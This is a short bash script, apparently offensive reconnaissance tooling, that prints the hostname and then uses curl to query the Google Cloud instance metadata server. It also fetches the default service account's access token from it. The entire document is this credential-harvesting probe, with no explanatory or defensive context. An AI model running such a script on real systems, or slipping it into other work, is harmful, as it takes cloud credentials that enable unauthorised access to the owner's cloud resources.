#!/bin/bash

echo "[+] Hostname:"
hostname

echo "[+] Trying metadata root:"
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/

echo "[+] Trying token fetch:"
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
